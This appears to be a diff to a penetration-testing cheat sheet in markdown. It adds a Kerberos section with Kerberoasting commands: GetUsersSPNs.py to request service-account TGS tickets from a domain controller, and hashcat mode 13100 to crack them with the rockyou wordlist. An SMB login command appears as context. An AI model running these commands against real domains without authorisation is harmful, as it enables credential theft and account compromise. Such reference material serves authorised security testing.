@@ -83,6 +83,17 @@ SMB
 impacket-smbclient '<USER>:<PASSWORd>'@<DC IP>
  
 ```
+```markdown
+KERBEROS 
+
+# Dump SPN users TGS
+- GetUsersSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
+
+# Crack TGS
+- hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt --force
+ 
+```
+
 
 ## Web Application
 ```markdown
